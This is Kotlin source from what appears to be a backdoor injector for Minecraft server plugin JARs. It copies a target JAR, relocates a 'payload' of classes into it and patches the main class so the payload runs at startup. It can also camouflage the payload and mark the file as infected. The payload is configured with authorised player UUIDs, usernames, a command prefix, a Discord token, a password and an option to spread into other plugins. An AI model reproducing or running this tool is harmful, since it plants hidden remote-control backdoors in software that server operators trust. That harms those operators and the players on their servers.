package com.tmquan2508.inject.injector

import com.github.ajalt.mordant.rendering.TextColors.*
import com.tmquan2508.inject.Config
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.injector.modules.*
import com.tmquan2508.inject.utils.*
import java.io.File
import java.io.IOException
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardCopyOption
import java.security.MessageDigest

fun patchPlugin(
    input: Path,
    output: Path,
    replace: Boolean,
    camouflage: Boolean,
    config: Config
) {
    if (!replace && Files.exists(output)) {
        Logs.finish().warn("Skipped because output file already exists: ${output.fileName}")
        return
    }

    if (isAlreadyPatched(input)) {
        Logs.finish().warn("Target is already patched. Skipping.")
        return
    }

    val patcher = Patcher(input, output, camouflage, config)
    try {
        patcher.run()
    } catch (e: Exception) {
        Logs.finish().error("A critical error occurred while patching ${input.fileName}: ${e.message}")
        if (Logs.debugEnabled) {
            e.printStackTrace()
        }
        try {
            Files.deleteIfExists(output)
            Logs.warn("Rollback successful. Deleted incomplete output file: ${output.fileName}")
        } catch (ioe: IOException) {
            Logs.error("Rollback failed: Could not delete incomplete output file.")
        }
    } finally {
        patcher.cleanup()
    }
}

private class Patcher(
    private val input: Path,
    private val output: Path,
    private val camouflage: Boolean,
    private val config: Config
) {
    private val tempDir = File("./.openbd")
    private val tempJar = File(tempDir, "patch.jar")

    private lateinit var targetInfo: TargetJarInfo
    private lateinit var processedPayload: ProcessedPayload
    private lateinit var modifiedMainClassBytes: ByteArray
    private lateinit var dominantVersion: JavaVersion

    fun run() {
        Logs.task("Patching ${input.fileName}")

        prepareWorkspace()
        analyzeTarget()
        processPayload()
        patchMainClass()
        assembleJar()

        Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
        logSummary()
        Logs.finish().info("Successfully patched ${input.fileName} -> ${green(output.fileName.toString())}")
    }

    fun cleanup() {
        if (tempDir.exists()) {
            tempDir.deleteRecursively()
        }
    }

    private fun prepareWorkspace() {
        Logs.info("[STEP 1] Preparing temporary workspace...")
        if (tempDir.exists()) {
            tempDir.deleteRecursively()
        }
        tempDir.mkdirs()
        Files.copy(input, tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING)
    }

    private fun analyzeTarget() {
        Logs.info("[STEP 2] Analyzing target JAR...")
        targetInfo = analyzeTargetJar(tempJar.toPath())
        Logs.info(" -> Found main class: ${brightCyan(targetInfo.mainClassName)}")

        dominantVersion = findDominantJavaVersion(tempJar.toPath())
        Logs.info(" -> Dominant Java version: ${brightCyan("Major " + dominantVersion.major.toString())} (e.g., Java ${dominantVersion.major - 44})")
    }

    private fun processPayload() {
        Logs.info("[STEP 3] Processing payload (relocating & configuring)...")
        processedPayload = processPayload(
            rawPayloadClasses = loadDefaultPayload(),
            camouflageEnabled = camouflage,
            targetJar = tempJar,
            dominantVersion = dominantVersion,
            uuids = config.authorizedUuids.joinToString(","),
            usernames = config.authorizedUsernames.joinToString(","),
            prefix = config.commandPrefix,
            injectOther = config.injectIntoOtherPlugins.toString(),
            warnings = config.displayDebugMessages.toString(),
            discordToken = config.discordToken,
            password = config.password?.toSha256() ?: "",
            camouflage = camouflage.toString()
        )
    }

    private fun patchMainClass() {
        Logs.info("[STEP 4] Patching main class entrypoint...")
        modifiedMainClassBytes = patchMainClass(
            originalMainClassBytes = targetInfo.mainClassBytes,
            finalPayloadClasses = processedPayload.finalClasses,
            finalMainPayloadCallName = processedPayload.finalMainPayloadName.replace('/', '.')
        )
    }

    private fun assembleJar() {
        Logs.info("[STEP 5] Assembling final JAR file...")
        assembleFinalJar(
            jarPath = tempJar.toPath(),
            modifiedMainClassBytes = modifiedMainClassBytes,
            mainClassPath = targetInfo.mainClassPath,
            finalPayloadClasses = processedPayload.finalClasses
        )
        setInfectionMarkerOnTarget(tempJar.toPath())
    }

    private fun logSummary() {
        Logs.info(" -> Summary of file changes:")
        Logs.info("  ${yellow("MODIFIED:")} ${targetInfo.mainClassPath}")
        processedPayload.finalClasses.forEach { classFile ->
            Logs.info("  ${brightCyan("ADDED:")}    ${classFile.name.replace('/', '.')}.class")
        }
    }

    private fun String.toSha256(): String = MessageDigest.getInstance("SHA-256")
        .digest(this.toByteArray())
        .joinToString("") { "%02x".format(it) }
}